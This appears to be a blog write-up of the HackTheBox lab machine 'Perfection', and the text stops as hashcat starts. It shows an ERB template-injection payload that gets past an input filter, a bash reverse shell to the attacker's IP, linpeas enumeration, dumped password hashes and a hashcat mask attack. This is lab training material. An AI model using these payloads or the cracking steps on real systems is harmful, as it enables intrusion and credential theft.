<!doctype html><html lang=en><head><title>HTB Perfection WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Perfection' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Perfection WriteUp"><meta name=twitter:description content="HackThebox 'Perfection' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/perfection/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Perfection WriteUp"><meta property="og:description" content="HackThebox 'Perfection' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-06T00:00:00+00:00"><meta property="article:modified_time" content="2024-07-06T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Burpsuite"><meta property="article:tag" content="Tcpdump"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/perfection/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/perfection/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/perfection/>HTB Perfection WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-07-06T00:00:00Z>6 July, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
7-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/tcpdump/>Tcpdump</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/command-injection/>Command Injection</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hashcat/>Hashcat</a></span></div></div></header><div class=post-content><h1 id=perfection----hackthebox>Perfection &ndash; HackTheBox
<a class=heading-link href=#perfection----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Perfection&rsquo; Avatar" src=/pentesting/images/Perfection_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Perfection</code> in an easy box from <code>HackTheBox</code> platform. Inside it we have a webpage that shows a calculator for Grades and their respective weights. Nevertheless, one of the fields inside this calculator allows command injection which allows us to gain access to the victim machine. Once inside, we note that our user belongs to the group <code>sudo</code>, so we only need to know its password to run any command as <code>root</code>. Using the tool <code>LinPEAS</code> we note that this user has an mail that tells us the password format our user should have, but not the password itself. Additionally, we find a <code>.db</code> file containing password hashes for multiple users. Based on the password format provided in the mail and the found hashes, we are able to guess the password through regular expressions with <code>Hashcat</code>. Once we have found the password, since we are members of <code>sudo</code> group, we can run any command as <code>root</code> and, therefore, we have gained full control over the target machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Nmap</code> scan only shows 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.253 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 00:26 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.253
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.17s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Weighted Grade Calculator
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds
</span></span></span></code></pre></div><p>Visiting <code>http://10.10.11.253</code> shows a simple page:</p><p><img alt="Perfection 1" src=/pentesting/images/Perfection_1.png></p><p>At the top I can see a tab that says <code>Calculate your weighted grade</code>. Here I can see a kind of a Grades calculator:</p><p><img alt="Perfection 2" src=/pentesting/images/Perfection_2.png></p><p>To check how this &ldquo;calculator&rdquo; works, I fill it with some data. If we fill it with some data that exceeds over 100 in <code>Weight</code> column I get an error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Please reenter! Weights do not add up to 100. 
</span></span></code></pre></div><p>If I try to inject command the page detects it:</p><p><img alt="Perfection 3" src=/pentesting/images/Perfection_3.png></p><p>where we can read <code>Malicious input blocked</code>.</p><p>To see if we have some inyectable parameters I will intercept the &ldquo;calculator&rdquo; with <code>Burpsuite</code>. Also, I start listening with <code>tcpdump</code> to check if I can send a <code>ping</code> command to my machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span></code></pre></div><p>In <code>Burpsuite</code> I intercept the request and it looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/weighted-grade-calc</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.253</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>156</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.253</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.253/weighted-grade</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>category1=a&amp;grade1=1&amp;weight1=100&amp;category2=b&amp;grade2=1&amp;weight2=0&amp;category3=c&amp;grade3=1&amp;weight3=0&amp;category4=d&amp;grade4=1&amp;weight4=0&amp;category5=e&amp;grade5=1&amp;weight5=0
</span></span></code></pre></div><p>I send this request to <code>Repeater</code> in <code>Burpsuite</code>. I start playing with the <code>category</code> parameters, since it accepts all kind of inputs unlike <code>grade</code> and <code>weight</code> parameters that only accept integers. After playing with some commands I reach the command injection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>category1=a%0A&lt;%25%3Dsystem(&#34;ping+-c1+10.10.16.2&#34;);%25&gt;
</span></span></code></pre></div><p>where <code>10.10.16.2</code> is my attacker IP address. So the whole <code>HTTP</code> request looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/weighted-grade-calc</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.253</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>200</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.253</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.253/weighted-grade</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>category1=a%0A&lt;%25%3Dsystem(&#34;ping+-c1+10.10.16.2&#34;);%25&gt;&amp;grade1=1&amp;weight1=100&amp;category2=b&amp;grade2=1&amp;weight2=0&amp;category3=c&amp;grade3=1&amp;weight3=0&amp;category4=d&amp;grade4=1&amp;weight4=0&amp;category5=e&amp;grade5=1&amp;weight5=0
</span></span></code></pre></div><p>and I get a trace in my <code>tcpdump</code> listener from the target IP address:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>00:58:55.997893 IP 10.10.11.253 &gt; 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
</span></span></span><span class=line><span class=cl><span class=go>00:58:55.997905 IP 10.10.16.2 &gt; 10.10.11.253: ICMP echo reply, id 2, seq 1, length 64
</span></span></span></code></pre></div><p>We have reached a <code>Command Injection</code>. I will send me a reverse shell using the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.2/443&#39;</span> 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span></code></pre></div><p>where, again, <code>10.10.16.2</code> is my attacker IP address and <code>443</code> is the port I will start listening with <code>netcat</code>.</p><p>Start the listener with <code>netcat</code> on port <code>443</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span></code></pre></div><p>then send the payload in <code>Burpsuite</code> <code>Repeater</code> with the request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/weighted-grade-calc</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.253</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>234</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.253</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.253/weighted-grade</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>category1=a%0A&lt;%25%3Dsystem(&#34;bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/10.10.16.2/443+0&gt;%261&#39;&#34;);%25&gt;&amp;grade1=1&amp;weight1=100&amp;category2=b&amp;grade2=1&amp;weight2=0&amp;category3=c&amp;grade3=1&amp;weight3=0&amp;category4=d&amp;grade4=1&amp;weight4=0&amp;category5=e&amp;grade5=1&amp;weight5=0
</span></span></code></pre></div><p>I get a shell as <code>susan</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.253] 43844
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (998): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>susan
</span></span></span></code></pre></div><p>we can read the user flag at <code>susan</code> home directory.</p><hr><h3 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>I note that <code>susan</code> is a member of <code>sudo</code> group. I.e., we are able to run any command with <code>sudo</code> as long we have the password. But we don&rsquo;t have it yet.</p><p>I decide to upload <code>LinPEAS</code> in the target machine. For this I start a temporal <code>HTTP</code> <code>Python</code> on port <code>8000</code> on my machine where <code>linpeas.sh</code> is located:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>linpeas.sh
</span></span></span></code></pre></div><p>and in the victim machine I download it using <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ wget http://10.10.16.2:8000/linpeas.sh -O /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-24 05:14:19--  http://10.10.16.2:8000/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.2:8000... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 847815 (828K) [text/x-sh]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äò/tmp/linpeas.sh‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/tmp/linpeas.sh                            100%[=======================================================================================&gt;] 827.94K   356KB/s    in 2.3s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-05-24 05:14:22 (356 KB/s) - ‚Äò/tmp/linpeas.sh‚Äô saved [847815/847815]
</span></span></span></code></pre></div><p>Assign to the downloaded file execution permissions and execute it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ chmod +x /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>susan@perfection:~/ruby_app$ /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>From the output, I note we have some mails:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Mails (limit 50)
</span></span></span><span class=line><span class=cl><span class=go>    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan
</span></span></span><span class=line><span class=cl><span class=go>    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/spool/mail/susan
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>and reading the mail at <code>/var/spool/mail/susan</code> we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ cat /var/spool/mail/susan
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials (&#39;our&#39; including the other students
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Note that all letters of the first name should be convered into lowercase.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>- Tina, your delightful student
</span></span></span></code></pre></div><p>From <code>LinPEAS</code> I also note that we have a file containing passwords/credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Searching *password* or *credential* files in home (limit 70)
</span></span></span><span class=line><span class=cl><span class=go>/etc/pam.d/common-password
</span></span></span><span class=line><span class=cl><span class=go>/home/susan/Migration/pupilpath_credentials.db
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/systemd-ask-password
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/systemd-tty-ask-password-agent
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/git-core/git-credential
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/git-core/git-credential-cache
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/git-core/git-credential-cache--daemon
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/git-core/git-credential-store
</span></span></span><span class=line><span class=cl><span class=go>  #)There are more creds/passwds files in the previous parent folder
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>If we read this file with <code>cat</code> it is a little bit bugged:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ cat /home/susan/Migration/pupilpath_credentials.db
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>^ableusersusersCREATE TABLE users (
</span></span></span><span class=line><span class=cl><span class=go>id INTEGER PRIMARY KEY,
</span></span></span><span class=line><span class=cl><span class=go>name TEXT,
</span></span></span><span class=line><span class=cl><span class=go>password TEXT
</span></span></span><span class=line><span class=cl><span class=go>a\
</span></span></span><span class=line><span class=cl><span class=go>Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023fsusan@perfection:~/ruby_app$
</span></span></span></code></pre></div><p>but if we check it with <code>strings</code> command we can see more info:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>susan@perfection:~/ruby_app$ strings /home/susan/Migration/pupilpath_credentials.db
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SQLite format 3
</span></span></span><span class=line><span class=cl><span class=go>tableusersusers
</span></span></span><span class=line><span class=cl><span class=go>CREATE TABLE users (
</span></span></span><span class=line><span class=cl><span class=go>id INTEGER PRIMARY KEY,
</span></span></span><span class=line><span class=cl><span class=go>name TEXT,
</span></span></span><span class=line><span class=cl><span class=go>password TEXT
</span></span></span><span class=line><span class=cl><span class=go>Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
</span></span></span><span class=line><span class=cl><span class=go>David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
</span></span></span><span class=line><span class=cl><span class=go>Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
</span></span></span><span class=line><span class=cl><span class=go>Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
</span></span></span><span class=line><span class=cl><span class=go>Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
</span></span></span></code></pre></div><p>I assume that this info is related to the found email, so we found an info with format:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>&lt;First Name&gt; &lt;Last Name&gt;&lt;hash&gt;
</span></span></code></pre></div><p>so we have a first name (<code>Susan</code>), also we have found a last name (<code>Miller</code>) and a hash (<code>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f</code>). Based on the email, the password will be something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>&lt;first_name&gt;_&lt;first_name_backwards&gt;_&lt;number between 1 and 1 000 000 000&gt;
</span></span></code></pre></div><p>In other words, for <code>susan</code> user we have to crack the hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>susan_nasus_&lt;number between 1 and 1 000 000 000&gt;
</span></span></code></pre></div><p>since the first and last names were in lowercase based on the info in the email. I also assume that the hash generated from this password has to be equal to the one found at <code>pupilpath_credentials.db</code> file for <code>Susan Miller</code> user.</p><p>For this we can attempt a <code>Brute Force Password Cracking</code> using <code>Regular Expressions</code> with <code>Hashcat</code>. First, using <code>hash-identifier</code>, this might be a <code>SHA-256</code> hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hash-identifier
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> HASH: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Possible Hashs:
</span></span></span><span class=line><span class=cl><span class=go>[+] SHA-256
</span></span></span><span class=line><span class=cl><span class=go>[+] Haval-256
</span></span></span></code></pre></div><p>looking at <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" class=external-link target=_blank rel=noopener>examples hashes for Hashcat</a> we can see that we need <code>mode 1400</code> for this hash.</p><p>Now, we can finally run <code>Hashcat</code> along with regular expressions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hashcat -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f &#34;susan_nasus_?d?d?d?d?d?d?d?d?d&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>hashcat (v6.2.6) starting
